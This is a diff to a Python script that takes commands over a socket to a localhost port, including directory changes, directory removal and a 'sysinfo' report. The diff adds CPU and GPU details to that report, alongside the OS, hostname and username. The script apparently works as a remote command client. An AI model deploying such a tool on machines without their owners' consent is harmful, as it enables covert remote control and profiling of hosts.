@@ -7,6 +7,7 @@ import subprocess
 import psutil
 import cpuinfo
 import tqdm
+import GPUtil
 
 HOST = '127.0.0.1'
 PORT = 5822
@@ -48,14 +49,38 @@ while is_running:
                 os.chdir(_multi_words_dir(cmd))
             sock.send('>> '.encode())
         elif cmd == 'sysinfo':
+            GPU_list = []
+            for gpu in GPUtil.getGPUs():
+                gpu_data = {
+                'ID': f'{gpu.id}',
+                'Name': f'{gpu.name}',
+                'Memory': f'{gpu.memoryTotal - gpu.memoryFree} / {gpu.memoryTotal} MB',
+                'Load': f'{gpu.load}%',
+                'Temp': f'{gpu.temperature} C',
+                'UUID': f'{gpu.uuid}',
+                'Driver': f'{gpu.driver}'
+                }
+                GPU_list.append(gpu_data)
+                
             sysinfo = f"""
             OS: {platform.system()}
             Name: {platform.node()}
             User: {getpass.getuser()}
             Version: {platform.release()}
-            CPU: {cpuinfo.get_cpu_info()['brand_raw']}
-            RAM: {round(psutil.virtual_memory()[0] / 1024.**3, 2)} gb
+            CPU: 
+                Name: {cpuinfo.get_cpu_info()['brand_raw']}
+                Frequency: {psutil.cpu_freq().current} MHz
+                Cores: {psutil.cpu_count(logical=False)}
+                Load: {psutil.cpu_percent()}%
+            RAM: {round(psutil.virtual_memory()[0] / 1024.**3, 2)} GB
             """
+            
+            if len(GPU_list) > 0:
+                sysinfo += 'GPUs:\n'
+                for gpu in GPU_list:
+                    for key, value in gpu.items():
+                        sysinfo += f'\t\t{key}: {value}\n'
+                        
             sock.send(sysinfo.encode())
         elif cmd.split(' ')[0] == 'rmdir':
             if len(cmd.split()) > 1:
